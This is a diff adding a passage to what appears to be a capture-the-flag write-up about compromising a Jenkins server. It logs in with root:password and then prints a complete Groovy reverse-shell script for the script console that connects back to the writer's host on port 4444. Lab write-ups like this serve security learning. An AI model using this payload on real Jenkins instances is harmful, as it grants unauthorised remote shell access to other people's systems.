@@ -56,4 +56,20 @@ Jenkins seems to be an [open-soucred CI/CD](https://www.jenkins.io/) ? I could n
 
 Turns out `root:password` was the correct combination.
 
-Now, Jenkins is a CI/CD tool, so it's likely that there is a way to upload a script to the tool and somehow get shell. A some research 
+Now, Jenkins is a CI/CD tool, so it's likely that there is a way to upload a script to the tool and somehow get shell. A some research led me to [this website](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6), which has detailed steps on getting shell using the script console.
+
+![](assets/jenkins_script_console.png)
+
+## Getting Shell
+
+Following the website guide, 
+
+```groovy
+String host="{my localhost port}";
+int port=4444;
+String cmd="bash";
+Process p=new
+
+ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
